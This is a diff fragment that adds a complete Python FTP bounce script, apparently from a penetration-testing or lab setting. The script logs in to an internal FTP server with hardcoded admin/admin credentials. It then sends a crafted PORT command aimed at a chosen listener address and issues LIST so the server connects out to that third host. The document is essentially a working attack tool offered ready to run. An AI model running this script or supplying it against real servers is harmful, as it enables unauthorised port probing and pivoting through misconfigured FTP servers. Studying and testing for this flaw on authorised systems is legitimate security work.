@@ -239,3 +239,90 @@ ftp_bounce_tester.py
 
 python3 ftp_bounce_tester.py --ftp 10.30.7.25 --user admin --pass admin \
   --listen 169.254.131.67 --ports 10794,10800 --timeout 10 --retries 2 -v
+
+
+
+
+
+
+
+#!/usr/bin/env python3
+"""
+ftp_bounce_bindsrc.py
+- Binds the control connection to a specific local source IP (10.30.15.180)
+- Sends PORT <listener_ip,port> and issues LIST
+- Use on a host that actually has 10.30.15.180 assigned
+"""
+
+import socket, sys, time
+from ftplib import FTP
+
+FTP_HOST = "10.30.7.25"
+FTP_USER = "admin"
+FTP_PASS = "admin"
+SRC_IP = "10.30.15.180"   # source address for control connection
+LISTEN_IP = "10.30.15.180"
+LISTEN_PORT = 10794
+TIMEOUT = 8
+
+def ip_port_to_port_tuple(ip, port):
+    parts = ip.split('.')
+    p1 = port // 256
+    p2 = port % 256
+    return ','.join(parts + [str(p1), str(p2)])
+
+def control_connect_with_source(src_ip, dest_host, dest_port=21, timeout=5):
+    # create a socket, bind source IP, connect to FTP server
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.settimeout(timeout)
+    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+    s.bind((src_ip, 0))                # bind source address + ephemeral port
+    s.connect((dest_host, dest_port))  # connect to ftp server
+    return s
+
+def main():
+    print(f"[+] Trying control connection bound to {SRC_IP} -> {FTP_HOST}:21")
+    try:
+        s = control_connect_with_source(SRC_IP, FTP_HOST, 21, timeout=5)
+    except Exception as e:
+        print(f"[-] Control connect failed: {e}")
+        sys.exit(1)
+
+    # wrap the existing socket into an ftplib.FTP instance
+    ftp = FTP()
+    ftp.sock = s
+    ftp.file = s.makefile('rwb')
+    ftp.welcome = ftp.getresp()   # read welcome banner
+
+    try:
+        print("[+] Logging in...")
+        ftp.login(FTP_USER, FTP_PASS)
+        port_arg = ip_port_to_port_tuple(LISTEN_IP, LISTEN_PORT)
+        print(f"[+] Sending PORT {port_arg}")
+        resp = ftp.sendcmd("PORT " + port_arg)
+        print("[+] PORT response:", resp)
+
+        # issue LIST to trigger data connection; don't hang forever
+        try:
+            ftp.sock.settimeout(TIMEOUT)
+            print("[+] Issuing LIST (this should trigger data connection to listener)")
+            ftp.retrlines('LIST')
+        except Exception as e:
+            print("[*] LIST raised/closed (expected in some cases):", e)
+
+    except Exception as e:
+        print("[-] FTP error:", e)
+    finally:
+        try:
+            ftp.quit()
+        except Exception:
+            try:
+                ftp.close()
+            except Exception:
+                pass
+
+    print("[+] Done. Check listener (nc/tcpdump) on", LISTEN_IP, "port", LISTEN_PORT)
+
+if __name__ == '__main__':
+    main()
+
